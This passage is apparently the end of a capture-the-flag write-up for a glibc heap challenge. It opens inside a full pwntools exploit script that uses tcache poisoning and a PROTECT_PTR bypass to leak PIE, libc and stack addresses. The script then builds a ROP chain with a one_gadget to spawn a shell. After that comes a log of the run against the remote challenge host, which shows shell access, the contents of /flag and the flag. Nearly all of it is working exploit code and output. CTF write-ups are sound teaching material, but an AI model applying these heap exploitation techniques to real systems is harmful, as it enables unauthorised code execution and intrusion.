# Overwrite the heap management segment to gain more consistent arbitrary r/w
payload = b'A'*0x128            # Padding to reach FD of t-cache entry 0
edit(4, payload)

# -------- Loop to abuse 8-byte alignment to reach t-cache --------- #
for i in range(2, 13):
    if i%3 == 0:
        payload += b'A'*0x10
    else:
        payload += b'A'*0x8
    edit(4, payload)
# ------------------------------------------------------------------ #



# Defeat PROTECT_PTR and insert the address of garbage_truck in to the tcache
prot_xor = heap_leak>>12	# Get the pos >> PAGE_SHIFT "xor key"
dest = heap_leak+0x100		# Destination is the malloc management chunk
fin = prot_xor ^ dest		# Calculate the PROTECT_PTR result
info("PROTECT_PTR res: %s^%s = %s" % (hex(prot_xor), hex(dest), hex(fin)))

edit(4, payload+p64(fin))	# Send payload

# malloc() to make the next t-cache entry the dest address
malloc(0x100-0x8, b'_')



# Get a PIE leak
base_ptr = ld + 0x34300
malloc(0x100-0x8, p64(base_ptr))                # Put ld.so pointer to base in bin

malloc(0x100-0x8, b'\x08')                      # malloc() the ld.so pointer and read the pointer to get PIE, 
                                                # making sure to overwrite the lower null-byte so puts can read

elf.address = int(see(9)[::-1].hex(), 16) - 8   # Parse the leak (and subtract the null-byte overwriting)
info('Base address: %s' % hex(elf.address))


# Taking control of &garbage_truck (the malloc indexer) 
edit(8, p64(elf.symbols['garbage_truck'])) # Set the next tcache addr directly to garbage_truck

payload =  p64(0xdeadbeefcafebabe)              # Entry 0 will be the 'buffer' for operations
payload += p64(elf.symbols['garbage_truck'])    # Entry 1 will be the buffer for entry 0
payload += p64(heap_leak + 0x100)               # Entry 2 will be the next tcache pointer
payload += p64(elf.symbols['garbage_truck']+88) # Entry 3 will control the malloc counter
malloc(0x100-0x8, payload)                      # Malloc on top of &garbage_truck and write payload


# Getting a stack leak
edit(3, p64(0x5))								# Set malloc counter to 5 (only entries we need)

edit(1, p64(elf.symbols['garbage_truck']+32))	# Set entry 0 to point to entry 5 (which will be used as a pointer to __libc_argc)
edit(0, p64(libc.symbols['__libc_argv']))		# Actual pointer to __libc_argv

sp = int(see(4)[::-1].hex(), 16) - 296			# Parse the leak and subtract correct values to get desired address
info("Stack pointer: %s" % hex(sp))



# Prepare next t-cache entry to be the address of upcoming RIP
edit(2, p64(sp-32))

# Get shellz with simple ROP and a one_gadget
popr        = libc.address + 0x000000000002b9e3 # : pop r12 ; pop r13 ; ret

one_gadget  = libc.address + 0xd05ea            # 0xd05ea execve("/bin/sh", r12, r13)
                                                # constraints:
                                                #   [r12] == NULL || r12 == NULL
                                                #   [r13] == NULL || r13 == NULL
 
payload = b'A'*24    # Padding
payload += p64(popr) # gadget to pop contrains
payload += p64(0)*2  # Set r12 and r13 to 0
payload += p64(one_gadget)  # One gadget


# Trigger the one_gadget
p.sendline(b'1')                    # Call malloc() menu option
p.sendline(str(0x100-8).encode())   # Malloc t-cache pointer (RBP value)
p.sendline(payload)                 # Send payload and ROP the process


# profit
p.sendline(b"id")

p.interactive()
```



###### Running the exploit script

```bash
$ python3 solve.py 
[*] '/chal/garbage-is-easy/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
[*] '/chal/garbage-is-easy/glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to garbage.hack.fe-ctf.dk on port 1337: Done
[*] Mallocing 0x168 bytes
[*] Overwriting top chunk size with 0xc01
[*] Calling malloc to pad up until HEAP pointer
[*] Heap leak: 0x55b0439e8000
[*] Calling malloc to pad up until Libc pointer
[*] Libc leak: 0x7fbff4902000
[*] Ld leak: 0x7fbff4adf000
[*] Mallocing new chunk to prepare fake free list
[*] Fake free location: 0x55b0439e8600
[*] Buf2 location 0x55b0439e86e0
[*] Buf1 location 0x55b0439e8700
[*] Mallocing 1200 bytes to sort unsorted bin...
[*] PROTECT_PTR res: 0x55b0439e8^0x55b0439e8100 = 0x55b5189ab8e8
[*] Base address: 0x55b041e3e000
[*] Stack pointer: 0x7ffc68f63d10
[*] Switching to interactive mode
How much are you throwing out:
What are you throwing out:
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat /flag
flag{t0p_chunk_3x7ensi0n-t0_f4k3_fre3_l1zt&tCh4c3_p0zion!}
```



###### Flag

`flag{t0p_chunk_3x7ensi0n-t0_f4k3_fre3_l1zt&tCh4c3_p0zion!}`

